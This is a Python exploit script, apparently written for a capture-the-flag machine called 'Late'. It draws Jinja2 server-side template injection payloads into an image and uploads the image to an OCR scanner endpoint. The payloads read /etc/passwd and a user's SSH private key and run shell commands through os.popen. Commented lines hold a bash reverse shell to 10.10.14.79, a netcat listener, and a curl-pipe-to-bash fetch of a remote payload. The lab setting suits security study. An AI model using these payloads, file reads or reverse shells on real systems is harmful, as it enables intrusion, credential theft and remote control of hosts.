import requests
import urllib.parse
from PIL import Image, ImageDraw, ImageFont

# payload = "2*2" # POC
# payload = 'config.items()'

# extract files
# payload = 'get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()'
payload = 'get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read()'

# code execution
command = "id" # uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
command = "pwd" # /home/svc_acc/app
command = "env"
command = "dir"
command = "dir .."
command = "echo '/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.79/9999 0 > &1\"' > /home/svc_acc/.foo"
# command = "cat /home/svc_acc/.foo"
# command = "cat /home/svc_acc/.ssh/authorized_keys"
command = "cp /home/svc_acc/user.txt /tmp/bar"
command = "more /tmp/bar"
command = "mv /tmp/bar /home/svc_acc/.foo"
command = "cat ../.ssh/id_rsa"

# REVERSE SHELL
# nc -lnvp 9999
# cd www && python3 -m http.server 8000
# command = "curl 10.10.14.79:8000/revshell | bash"

# payload = 'self._TemplateReference__context.joiner.__init__.__globals__.os.popen("{}").read( )'.format(command)

payload_filename = "payload.png"


def download_image(payload):

    # encoded = urllib.parse.quote_plus(payload)
    encoded = payload
    print(payload)
    # print(encoded)
    # url = "https://dummyimage.com/1000x100/ffffff/000000&text=_+_f+f+%7B%7B+{}+%7D%7D".format(encoded)
    url = "https://dummyimage.com/600x120/ffffff/000000&text=+.+_+I+|+%7B%7B+{}+%7D%7D".format(encoded)
    print(url)
    response = requests.get(url)
    with open(payload_filename, 'wb') as f:
        f.write(response.content)

def post_image():
    url = "http://images.late.htb/scanner"
    files = {'file': open(payload_filename, 'rb')}
    response = requests.post(url, files=files)
    print(response.text.replace("<p>_", "").replace("</p>", ""))
    # print(urllib.parse.unquote(response.text))

def generate_image(payload):
    font_path = '/usr/share/fonts/truetype/dejavu/DejaVuSans-ExtraLight.ttf'
    font_path = "/usr/share/fonts/opentype/roboto/slab/RobotoSlab-Thin.otf"
    font_path = "/usr/share/fonts/opentype/roboto/slab/RobotoSlab-Regular.otf"
    image_text = '... _ {{ ' + payload + ' }}'
    print(image_text)
    img = Image.new('RGB', (1500, 60), color=(255, 255, 255))
    fnt = ImageFont.truetype(font_path, 24)
    d = ImageDraw.Draw(img)
    d.text((10, 10), image_text, fill=(0, 0, 0), align="center", font=fnt, spacing=20 )
    img.save(payload_filename)

# download_image(payload)
generate_image(payload)
post_image()
